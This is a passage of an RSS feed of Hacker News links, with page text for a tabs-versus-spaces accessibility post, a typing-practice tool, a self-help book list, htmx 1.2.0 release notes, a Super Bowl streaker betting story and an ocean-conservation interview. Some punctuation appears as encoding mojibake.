            </description>
            <link>http://stedolan.net/research/mov.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128978</guid>
            <pubDate>Sun, 14 Feb 2021 01:57:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Default to tabs instead of spaces for an 'accessible first' environment (2019)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26128920">thread link</a>) | @macintux
<br/>
February 13, 2021 | https://alexandersandberg.com/tabs-for-accessibility/ | <a href="https://web.archive.org/web/*/https://alexandersandberg.com/tabs-for-accessibility/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  
    
  

  <span>
  
    #<a href="https://alexandersandberg.com/dev/">dev</a> / 
  

  
    published july 11th, 2019
  
</span>

  
    
    <p>I‚Äôm sure you‚Äôve come across the age-old, opinion-based debate of ‚ÄòTabs vs. Spaces‚Äô for <em>indentation</em> before. It has been going since forever, and there seem to be valid reasons for both sides:</p>
<p><strong>Tabs‚Ä¶</strong></p>
<ul>
<li>smaller files because it‚Äôs just 1 character</li>
<li>that‚Äôs what they‚Äôre used for</li>
<li>you can customize your own indentation width (üëà keep this one in mind)</li>
</ul>
<p><strong>Spaces‚Ä¶</strong></p>
<ul>
<li>to avoid problems in whitespace-sensitive environments</li>
<li>because you know what you‚Äôll get, and consistency is key</li>
</ul>
<p>But, there‚Äôs more to this than just personal preferences. <a href="https://www.reddit.com/user/ChaseMoskal">u/ChaseMoskal</a> recently posted a very insightful and eye-opening post on Reddit with the title <a href="https://www.reddit.com/r/javascript/comments/c8drjo/nobody_talks_about_the_real_reason_to_use_tabs/">‚ÄúNobody talks about the real reason to use Tabs over Spaces‚Äù</a>.</p>
<h2 id="the-one-real-reason-to-use-tabs-over-spaces">The one real reason to use tabs over spaces</h2>
<p>In his post, Chase explains his own experience of using spaces at his workplace, and the negative effects it had on co-workers with visual impairment.</p>
<p>One of his co-workers uses a tab-width of <code>1</code>, to avoid huge indentations when using a large font-size.</p>
<p>Another co-worked of his is using a tab-width of <code>8</code> because that works best for his situation with a wide monitor.</p>
<blockquote>
<p>I see people saying ‚Äútabs lets us customize our tab-width‚Äù, as though we do this ‚Äúfor fun‚Äù ‚Äî Chase</p>
</blockquote>
<p>By using tabs in our projects, we allow these kinds of customizations that are <em>essential</em> for people with visual impairment. Custom tab-widths might seem like an unnecessary thing to most, but some people rely on it‚Äîand we <em>can not</em> ignore that.</p>
<h2 id="accessible-first">Accessible first</h2>
<p>We simply can‚Äôt ‚Äúconvert‚Äù everyone to one side or the other, there‚Äôs no question about it. Everyone has their own preferences, and we should celebrate that freedom‚Äîthat we have the ability to make our own choices.</p>
<p>But with that said, we should also make sure to include <em>everyone</em>, and that means respecting and using accessible tools like the Tab-character.</p>
<p>Much like designing for ‚Äòmobile first‚Äô‚Äîmaking sure everyone, no matter what device, has a great experience with your product‚Äîwe should create an ‚Äò<strong>accessible first</strong>‚Äô environment, by making sure that everyone has the same ability to work, whether it‚Äôs at the workplace or on an open-source project.</p>
<p>I thought Chase put it perfectly when he said in his post that <em>"‚Ä¶there‚Äôs just no counter-argument that even comes close to outweighing the accessibility needs of valued coworkers‚Äù</em>.</p>
<h2 id="conclusion--accessible-first-personal-preference-second">Conclusion ‚Äî Accessible first, personal preference second</h2>
<p>By defaulting to tabs, we make sure that everyone has a great experience working together with others, no matter their own abilities.</p>
<p>And if you prefer spaces, feel free to use an auto-formatting tool that converts tabs to spaces when opening a file (all modern editors have these). Just make sure that the spaces get converted back to tabs before anyone else has to work on your code.</p>
<blockquote>
<p>Only by making sure everyone has the same capability can we maximize our combined potential ‚ù§Ô∏è</p>
</blockquote>
  
</article></div>]]>
            </description>
            <link>https://alexandersandberg.com/tabs-for-accessibility/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128920</guid>
            <pubDate>Sun, 14 Feb 2021 01:44:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Programmer's Typing Practice]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128286">thread link</a>) | @climech
<br/>
February 13, 2021 | https://climech.github.io/typing-practice/ | <a href="https://web.archive.org/web/*/https://climech.github.io/typing-practice/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="root">
    <header>
      
    </header>

    <section id="welcome">
      <p>This tool was inspired by George Hotz's <span>mad skillz</span>, and the ideas found in the book <a href="https://amzn.to/3qil2uQ" target="_blank"><em>Make It Stick</em></a> by Peter C. Brown. There are no timers, no WPMs‚Äîjust a never-ending stream of gibberish. Aim for accuracy over speed. Adjust the weights below to emphasize areas you're struggling with. With regular practice, typing structured text should become easier.

      </p><div>
        <p><strong>Tip:</strong> Practicing with a 

        </p><p>
          <span>metronome</span>
          
          
        </p><p>

        can be a good way to improve consistency.
      </p></div>
    </section>
    
    <div id="practice">
      
      <section>
        
      </section>
      <div>
        <div>
          <p>A‚ÄìZ</p>
          <div>
            <p><span>1</span></p>
          </div>
        </div>

        <div>
          <p>a‚Äìz</p>
          <div>
            <p><span>1</span></p>
          </div>
        </div>

        <div>
          <p>0‚Äì9</p>
          <div>
            <p><span>1</span></p>
          </div>
        </div>

        <div>
          <p>!@#‚Ä¶</p>
          <div>
            <p><span>1</span></p>
          </div>
        </div>
        
        <svg></svg>
      </div>

      <p>You have typed <span>0</span> characters so far.</p>
    </div>

    
  </div></div>]]>
            </description>
            <link>https://climech.github.io/typing-practice/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128286</guid>
            <pubDate>Sat, 13 Feb 2021 23:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five of the Best Self-Help Books for Achieving Your Goals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128247">thread link</a>) | @digitcatphd
<br/>
February 13, 2021 | https://wimgo.com/five-of-the-best-self-help-books-for-achieving-your-goals/ | <a href="https://web.archive.org/web/*/https://wimgo.com/five-of-the-best-self-help-books-for-achieving-your-goals/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p><span datetime="2021-02-09T04:40:33+00:00" itemprop="datePublished">February 9, 2021</span></p><p><img width="1200" height="800" src="https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1200x800.png" data-src="https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1200x800.png" alt="" data-srcset="https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1200x800.png 1200w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-300x200.png 300w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1024x683.png 1024w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-768x512.png 768w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1536x1024.png 1536w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-2048x1366.png 2048w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1980x1320.png 1980w" data-sizes="(max-width: 1200px) 100vw, 1200px" srcset="https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1200x800.png 1200w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-300x200.png 300w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1024x683.png 1024w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-768x512.png 768w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1536x1024.png 1536w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-2048x1366.png 2048w, https://wimgo.com/wp-content/uploads/2021/02/21d49482-ba78-4432-adcf-dcdddde83b1c-1-1980x1320.png 1980w"></p><p>There are a number of great self-help books that can offer advice and guidance. Some of the best address specific barriers that need consideration. Others consider various perspectives that can get in our way. And still others provide an excellent roadmap for achieving success through real practical tools and activities. If you want this year to be your best, you may consider investing in some of these enlightening books. While several are worthwhile, the following five self-help books can help you achieve your goals and should definitely be on your reading list.</p><figure><img width="212" height="313" src="https://wimgo.com/wp-content/uploads/2021/02/project-bold-life.jpg" data-src="https://wimgo.com/wp-content/uploads/2021/02/project-bold-life.jpg" alt="" data-srcset="https://wimgo.com/wp-content/uploads/2021/02/project-bold-life.jpg 212w, https://wimgo.com/wp-content/uploads/2021/02/project-bold-life-203x300.jpg 203w" data-sizes="(max-width: 212px) 100vw, 212px" srcset="https://wimgo.com/wp-content/uploads/2021/02/project-bold-life.jpg 212w, https://wimgo.com/wp-content/uploads/2021/02/project-bold-life-203x300.jpg 203w"></figure><p><strong>Project Bold Life ‚Äì The Proven Formula to Take on Challenges and Achieve Happiness and Success by Edward M. Kopko</strong></p><p>There are goals, and there are Bold Goals. Bold Goals are those that stretch us to our limits and allow us to overcome some of the most profound challenges. In doing so, we enjoy the pursuit of the Boldest Life possible, regardless of our specific situation. This is the perspective that Ed Kopko shares in his inspirational and critically acclaimed book, PROJECT BOLD LIFE (<a href="https://www.amazon.com/Project-Bold-Life-Challenges-Happiness-ebook/dp/B08DX38H7B">which is available on Kindle</a> and <a href="https://www.amazon.com/Project-Bold-Life-Challenges-Happiness/dp/1735334901">in paperback on Amazon</a>). Hands down, this is certainly one of the best engaging self-help books for those who want to be their best. <a href="https://www.projectboldlife.com/achievement/setting-life-goals/">Kopko breaks down the vital steps that go into creating goals</a>. (Hint: It‚Äôs not as easy as you think.) He also provides specific worksheets, formulas, and planners to help anyone in the process. As Kopko points out, many of us have faith in our abilities but we never truly act courageously on this faith. For more on <a href="https://www.edkopko.com/">Kopko and PROJECT BOLD LIFE, check out his website</a>.</p><figure><img width="207" height="314" src="https://wimgo.com/wp-content/uploads/2021/02/relentless.jpg" data-src="https://wimgo.com/wp-content/uploads/2021/02/relentless.jpg" alt="" data-srcset="https://wimgo.com/wp-content/uploads/2021/02/relentless.jpg 207w, https://wimgo.com/wp-content/uploads/2021/02/relentless-198x300.jpg 198w" data-sizes="(max-width: 207px) 100vw, 207px" srcset="https://wimgo.com/wp-content/uploads/2021/02/relentless.jpg 207w, https://wimgo.com/wp-content/uploads/2021/02/relentless-198x300.jpg 198w"></figure><p><strong><em>Relentless: From Good to Great to Unstoppable</em> by Tim S. Grover</strong></p><p>What does it take to go from being just good to being the best? What characteristics do those people who are considered to be among the best‚Äìsuperior athletes, successful businessmen, and more‚Äìshare that make them great? Author Tim. S. Grover takes a relative view when it comes to self-help, bringing others into the self-improvement equation and using their traits as a guide. But ultimately, his premise is that you can‚Äôt count on anyone else to give you motivation‚Äìit must come from within. It is filled with great stories about athletes he has trained. For that, plus its direct and honest approach, <a href="https://www.amazon.com/Relentless-Unstoppable-Tim-S-Grover-ebook/dp/B008O4TY3I">Relentless: From Good to Great to Unstoppable</a> is an essential read for anyone looking to make the most of themselves.</p><figure><img width="211" height="314" src="https://wimgo.com/wp-content/uploads/2021/02/big-magic.jpg" data-src="https://wimgo.com/wp-content/uploads/2021/02/big-magic.jpg" alt="" data-srcset="https://wimgo.com/wp-content/uploads/2021/02/big-magic.jpg 211w, https://wimgo.com/wp-content/uploads/2021/02/big-magic-202x300.jpg 202w" data-sizes="(max-width: 211px) 100vw, 211px" srcset="https://wimgo.com/wp-content/uploads/2021/02/big-magic.jpg 211w, https://wimgo.com/wp-content/uploads/2021/02/big-magic-202x300.jpg 202w"></figure><p><strong><em>Big Magic ‚Äì Creative Living Beyond Fear</em> by Elizabeth Gilbert</strong></p><p>For many of us, our largest goals involve a creative pursuit. Some involve writing a novel or painting a self-portrait. Others might include acting on Broadway or performing live in a band. All these creative pursuits, however, are very personal in nature, and we may resist pursuing such goals. Fortunately, <a href="https://www.amazon.com/Big-Magic-Creative-Living-Beyond/dp/1594634726">Elizabeth Gilbert tackles this subject in a unique way</a> and encourages us to be curious, fearless and loving. Gilbert‚Äôs approach is to embrace our creative side with both a sense of wonder and pragmatism. Sources of inspiration and creative ideas are everywhere, and all we need to do is recognize this. As one of the best self-help books for achieving creative goals, <em>Big Magic</em> is a great read.</p><figure><img width="182" height="296" src="https://wimgo.com/wp-content/uploads/2021/02/you-badass.jpg" data-src="https://wimgo.com/wp-content/uploads/2021/02/you-badass.jpg" alt=""></figure><p><strong><em>You Are a Badass ‚Äì How to Stop Doubting Your Greatness and Start Living an Awesome Life</em> by Jen Sincero</strong></p><p>There are many books on positivity that you might include on your reading list for 2021. But <a href="https://www.amazon.com/You-Are-Badass%C2%AE-Doubting-Greatness/dp/0762447699">Jen Sincero takes a no-nonsense approach to self-care while infusing both humor and practicality in her book</a>. In essence, her message is one of self-understanding, self-love, and an awareness that growth and change are essential. With these acknowledgements and pursuits, anyone can be a ‚Äúbadass‚Äù and achieve their goals. Sincero also stresses the importance of being positive in one‚Äôs attitude and inviting a sense of courageousness.</p><figure><img width="208" height="313" src="https://wimgo.com/wp-content/uploads/2021/02/daring-greatly.jpg" data-src="https://wimgo.com/wp-content/uploads/2021/02/daring-greatly.jpg" alt="" data-srcset="https://wimgo.com/wp-content/uploads/2021/02/daring-greatly.jpg 208w, https://wimgo.com/wp-content/uploads/2021/02/daring-greatly-199x300.jpg 199w" data-sizes="(max-width: 208px) 100vw, 208px" srcset="https://wimgo.com/wp-content/uploads/2021/02/daring-greatly.jpg 208w, https://wimgo.com/wp-content/uploads/2021/02/daring-greatly-199x300.jpg 199w"></figure><p><strong><em>Daring Greatly ‚Äì How the Courage to Be Vulnerable Transforms the Way We Live, Love, Parent and Lead</em> by Dr. Bren√® Brown</strong></p><p>Bren√® Brown has participated in over 12 years in research involving vulnerability, courage, shame and empathy. Few books tackle such topics well, which is why <a href="https://www.amazon.com/Daring-Greatly-Courage-Vulnerable-Transforms/dp/1592408419">Daring Greatly is one of the best self-help books to know</a>. Brown demonstrates how dealing with past embarrassments and feelings of shame can be liberating. She has achieved great success with her work and her lecture Brene Brown: The Call to Courage debuted on Netflix in 2019. Not only can this book boost one‚Äôs affected self-esteem and self-worth, but it can also help individuals move on courageously in a truthful and bold way. Ultimately, this helps us achieve our goals in life and enjoy much deeper connections with others.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://wimgo.com/five-of-the-best-self-help-books-for-achieving-your-goals/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128247</guid>
            <pubDate>Sat, 13 Feb 2021 23:54:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 25 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Super Bowl streaker says he bet $50k on his stunt]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128093">thread link</a>) | @aaron695
<br/>
February 13, 2021 | https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt80889749read"><div data-den="denmark"><div><ul><li>Super Bowl streaker Yuri Andrade made a splash Sunday at Raymond James Stadium in Tampa, Florida.</li><li>After his streaking stunt, Andrade said he had bet $50,000 that a streaker would take the field.</li><li>Now it looks as though Andrade won't be cashing in on his bets because he keeps talking about it.</li></ul><p data-pos="3">With just over five minutes remaining in Super Bowl LV, <a target="_blank" href="https://www.insider.com/video-fan-storms-super-bowl-field-great-run-2021-2" rel="nofollow">a fan ran onto the field</a>, briefly disrupting the Tampa Bay Buccaneers' march to victory over the Kansas City Chiefs.</p><p data-pos="4">Later identified as Yuri Andrade, the fan had a pretty successful run as far as streakers go. He made it onto the field, got some photos taken of himself in a hot-pink one-piece emblazoned with the name of an adult website, and evaded security long enough to interrupt the game. He even got <a target="_blank" href="https://www.insider.com/kevin-harlan-super-bowl-streaker-be-a-man-2021-2" rel="nofollow">a fantastic call from the legendary play-by-play man Kevin Harlan</a>, who was broadcasting the game over the radio.</p><p>But after his stunt, reports began coming out that Andrade's run had been even more successful than initially thought. Andrade had not only made it onto the field but also claimed to have done so after placing a $50,000 wager that the Super Bowl would have a streaker, which would bring in $374,000 in winnings.</p><blockquote><div> <p data-pos="5">A post shared by Yuri andrade (@kingyuri)<time datetime=""></time></p></div></blockquote><p>Andrade's claim immediately raised eyebrows in the betting community. Patrick Everson of Covers said on Twitter that offshore sportsbooks likely would have had limits in place to prevent such a bet from being made.</p><blockquote data-lang="en" data-cards="" data-conversation="">‚ÄîPatrick Everson  (@Covers_Vegas) <a target="_blank" href="https://twitter.com/mims/statuses/1358976651061653505?ref_src=twsrc%5Etfw" rel="nofollow">February 9, 2021</a></blockquote><p data-pos="9">Todd Fuhrman of the "Bet the Board" podcast also had questions about Andrade's wager, as he had initially told TMZ Sports that he sent someone to Las Vegas to make the wager. Since placing bets on off-field events isn't allowed at Vegas sportsbooks, the story immediately seemed phony.</p><blockquote data-lang="en" data-cards="" data-conversation="">‚ÄîTodd Fuhrman  (@ToddFuhrman) <a target="_blank" href="https://twitter.com/mims/statuses/1359373081475620865?ref_src=twsrc%5Etfw" rel="nofollow">February 10, 2021</a></blockquote><p>But despite initial suspicions, it appears that there was some truth to Andrade's claim, though he still won't be cashing in on his run.</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p data-pos="12">Andrade <a target="_blank" href="https://theathletic.com/2378461/2021/02/11/super-bowl-streakers-motives-latest-arrest-follows-a-long-history-of-problems/" rel="nofollow">told a Tampa radio station</a> that he had gotten friends to place wagers from different accounts on the gambling site Bovada. They bet that there would be a fan on the field at +750 odds. With several smaller wagers rather than one big $50,000, it's more conceivable that Andrade could have gotten a healthy wager down on his run.</p><p>According to a report <a target="_blank" href="https://frontofficesports.com/offshore-sportsbook-voids-bets-linked-to-super-bowl-streaker/" rel="nofollow">from A.J. Perez at Front Office Sports</a>, Bovada was working to identify accounts that knew of Andrade's planned stunt."Our players have always trusted us to ensure the integrity of all props offered in our sportsbook," a Bovada spokesman told Perez. "We will continue to make sure that any publicity stunts or ill-intended behavior cannot adversely affect the outcome of a player's wager."</p><p data-pos="15">According to Perez, Bovada is refunding those that wagered there would not be a fan on the field during the game and paying out winning bets for accounts that were not linked to early knowledge of Andrade's plan. Perez wrote that one bettor who said he had no prior knowledge of the stunt had already had his account shut down by Bovada.</p><p data-pos="16">Ultimately, it looks as though Andrade's plan to bet on himself won't end up in the big payday that he had hoped for, but it appears he came closer to success than many initially suspected.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128093</guid>
            <pubDate>Sat, 13 Feb 2021 23:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Surprising Connections Can Save the Ocean]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127918">thread link</a>) | @dnetesn
<br/>
February 13, 2021 | http://wise.nautil.us/feature/663/how-surprising-connections-can-save-the-ocean | <a href="https://web.archive.org/web/*/http://wise.nautil.us/feature/663/how-surprising-connections-can-save-the-ocean">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>M</span>any marine biologists identify a gateway drug into their obsession, and for Heather Koldewey, it was the seahorse. Who can blame her? Seahorses seem to have evolved not entirely in the ocean, but also by way of a whimsical storybook, in which animal body parts are all mixed up. A fish with the head of a horse? A male that gets pregnant, gives birth, and is monogamous?</p>

<p>Seahorses led her not only to her career as the head of marine and freshwater conservation at the London Zoological Society, but to her efforts as an activist as well. Shortly after getting her Ph.D., Koldewey co-founded <a href="https://www.projectseahorse.org/" target="_blank">Project Seahorse</a> to protect her study subject and the ocean habitats they live in.</p>
<p>Today, Koldewey amplifies both her science and her on-the-ground protection efforts in visionary and critical ways. She was instrumental in getting the Indian Ocean√¢‚Ç¨‚Ñ¢s Chagos Archipelago designated as a Marine Protected Area, which has helped degraded ecosystems revive and led to cross-disciplinary scientific breakthroughs. She helped forge the pioneering partnership <a href="https://net-works.com/" target="_blank">Net-works</a>, which supports local communities in the Philippines by helping them transform abandoned fishing nets into carpeting. Koldewey is helping make biodiversity protection a profitable business‚Äîand saving species as she goes.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/wise_ff547f2ac99f930c63a2d1d9074794e6.JPG" alt="Heather Koldewey_Chagos archipelago"><figcaption><span>Heather Koldeway is the head of marine and freshwater conservation at the London Zoological Society, and was integral to the founding of two different conservation groups, Project Seahorse and Net-Works.</span><br><span>Courtesy of Heather Koldeway</span></figcaption></figure>

<p><strong>How did seahorses get you into conservation?</strong></p>
<p>I did my Ph.D. research in genetics. The whole field of molecular genetics was just starting to reveal you could identify different populations of species and where they came from by genetic markers. Amanda Vincent and I realized we could use genetics to combat the global market in seahorse trade. [More than 37 million seahorses a year are marketed for traditional medicinal use, aquariums, and souvenirs, and as a result they are threatened with extinction.] We could trace where the seahorses came from and target protection efforts to those areas. Amanda and I started Project Seahorse together, using this charismatic species to tackle big ocean issues. She√¢‚Ç¨‚Ñ¢s become the director as I√¢‚Ç¨‚Ñ¢ve concentrated on other things. I stay involved and care deeply about that work.</p>
<p><strong>What did molecular genetics tell you about seahorses?</strong></p>
<p>Seahorses are rubbish at swimming, and they have home ranges. They are very immobile. You would expect that they would be highly structured, meaning that in a particular place you would find a particular species. It turns out that√¢‚Ç¨‚Ñ¢s not usually the case. Even when seahorses are morphologically distinct (and don√¢‚Ç¨‚Ñ¢t look alike), they turn out to be closely related. Yet they are found in so many places around the globe. How can that be? They hitch a ride on whatever√¢‚Ç¨‚Ñ¢s passing by and move vast distances.</p>
<blockquote>When biologists and physicists&nbsp;get to put their heads together, we learn new things.</blockquote>
<p><strong>Seahorses are equally ubiquitous and threatened.</strong></p>
<p>I have a quest for solutions in the science. How do you solve problems seahorses are facing? One approach is captive breeding programs in zoos to address the aquarium trade, and there has been major progress. But of course seahorses and all the species with which they coexist have to be protected where they live. Over-harvesting of fish and incredibly destructive bottom-trawling are decimating the oceans. Industrial fishing is a huge problem. Another is the relentless pressure on coastal communities that depend on fishing for survival.</p>
<p><strong>You were instrumental in helping secure the Chagos Archipelago in the Indian Ocean as one of the largest Marine Protected Areas (MPA) in the world. How can limiting human impacts on such a remote place benefit ocean health?</strong></p>
<p>Getting protection in the Indian Ocean is hard won and challenging. Some areas are so over-harvested they are ocean deserts. In 2009, a group of organizations, including mine, compiled the scientific evidence to help support protection around this archipelago, which is part of the British Indian Ocean Territory. In 2010, the Bertarelli Foundation, which has helped protect more than 2 million kilometers of marine areas over the past 20 years, helped the British government to establish what was then the world√¢‚Ç¨‚Ñ¢s largest no-take MPA.</p>
<p>The Chagos Archipelago is made up of 58 tiny islands and contains the largest coral atoll on Earth. Here marine life is abundant and diverse, representing a glimpse of what our oceans should look like. Although still affected, protected areas show resilience to climate change. We have research dating back 50 years that gives us valuable insights from this unique location.</p>
<p><strong>This work is about protection, but it has also yielded new insights into how the ocean functions. How?</strong></p>
<p>We√¢‚Ç¨‚Ñ¢ve known for a relatively long time that MPAs benefit reef-dwelling species, but haven√¢‚Ç¨‚Ñ¢t had as much information about how they influence the world of the ocean around them‚Äîmigratory species, for example, and pelagic (open ocean) species. We have more than 70 scientists from disciplines including physics, genetics, and biology all working in this one place, which has yielded fantastic new insights. For example, a manta scientist watching mantas feeding noticed that they suddenly seemed to disappear. He couldn√¢‚Ç¨‚Ñ¢t figure it out. What made them suddenly move? The physicist who was monitoring the underwater currents at the time was able to say, √¢‚Ç¨≈ìoh, it√¢‚Ç¨‚Ñ¢s the internal waves switching; takes their food right away.√¢‚Ç¨ÔøΩ</p>
<p>The amazing thing is that biologists and physicists don√¢‚Ç¨‚Ñ¢t often get to put their heads together, but when they do, we learn new things.</p>
<blockquote>Ocean health is key to supporting human life.</blockquote>
<p><strong>What about the islands themselves, the terrestrial ecosystems?</strong></p>
<p>We√¢‚Ç¨‚Ñ¢ve also learned quite a lot in the Chagos Archipelago about how the terrestrial health of the islands impacts the water. Some islands are invaded with rats, which decimate native species and decrease overall biomass. Rats eat eggs and chicks. The islands that don√¢‚Ç¨‚Ñ¢t have rats support more seabirds. There is a more robust nutrient flow between the water and the land, thanks to the seabirds, increasing the fish biomass off these healthy islands. These islands also seem to be more resilient to coral bleaching events.</p>
<p><strong>Everything is connected. Including people and wildlife.</strong></p>
<p>That idea is at the foundation of Net-Works. As you know, plastic pollution in the oceans is a huge and growing crisis. In addition to plastic bottles everywhere, discarded fishing nets are a terrible issue. In local communities that depend on fishing for survival, the more depleted the fish in their waters, the more nets they use‚Äîand eventually abandon when they are beyond repair. Net-Works has set up a supply-chain in the Philippines in which local people are paid to collect discarded nets, bale them, and ship them out to be recycled into nylon threads that are subsequently woven into carpeting. We√¢‚Ç¨‚Ñ¢ve collected enough nets thus far to wrap more than five times around the circumference of the globe. This project is not only helping to clean up the ocean, it is providing a revenue alternative to people who are unfairly exploited in the global fishing industry.</p>
<p>Net-Works has been so successful a project within the Zoological Society of London (where Heather works) that it has spun out into an independent social enterprise called <a href="https://coast4c.com/" target="_blank">Coast 4C</a>. 4C stands for √¢‚Ç¨≈ìcommunity, commerce, conservation, climate,√¢‚Ç¨ÔøΩ because they are all interconnected. This model has diversified from nets to include seaweed farming in the Philippines. Carrageenan extracted from seaweed is used in products all over the world, but like so many other supply chains, this one has been unfair to local communities. Coast 4C is putting together a model in which the people who live on the water and farm the seaweed will benefit from the supply chain and increase marine protection.</p>
<p><strong>Sorry for this inevitable pun, but there seems to be a sea-change in conservation underway.</strong></p>
<p>Yes. Conservation has largely depended on foundation money, grants, and funds from the government. But these are not always sustainable over time. How can we finance conservation for the long term? We are starting to see more and more initiatives that facilitate social and impact investment into conservation. We are seeing new players in the world of conservation‚Äîcorporate finance people, insurance executives. It√¢‚Ç¨‚Ñ¢s not just biologists and shouldn√¢‚Ç¨‚Ñ¢t be‚Äîeveryone can be a conservationist.</p>
<p><strong>In 2018 the United Nations reported 4.6 million fishing vessels in operation, harvesting two-thirds of fishing stocks to capacity and one-third at biologically unsustainable levels. Are you worried about ocean degradation?</strong></p>
<p>To say nothing of climate change, pollution, and acidification. Ocean health is key to supporting human life. For one thing, the ocean absorbs carbon dioxide and produces the air we breathe. More than 3 billion people rely directly on marine and coastal biodiversity to live.&nbsp;&nbsp;</p>
